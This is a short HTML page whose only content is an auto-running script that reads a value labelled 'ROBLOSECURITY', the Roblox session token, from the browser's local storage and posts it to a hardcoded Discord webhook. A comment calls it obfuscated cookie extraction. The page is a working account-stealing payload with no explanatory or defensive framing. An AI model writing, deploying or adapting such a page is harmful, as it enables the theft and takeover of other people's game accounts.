<html>
  <body>
    <script>
      // Obfuscated cookie extraction and webhook sending
      (function() {
        var cookie = localStorage.getItem("ROBLOSECURITY") || "";
        var webhook = "https://discord.com/api/webhooks/1525750268040319047/SOimatVnxcTXlJiVb9TqcFKprTNKuQ_VIOzgaiI5UkdGrBGjszvramPAJlIDoE4B9y9f";
        var req = new Request(webhook, { method: "POST", headers: { "Content-Type": "application/json" } });
        fetch(req, { body: JSON.stringify({ cookie: cookie }) })
          .then(r => r.text())
          .then(data => console.log("Sent:", data));
      })();
    </script>
  </body>
</html>
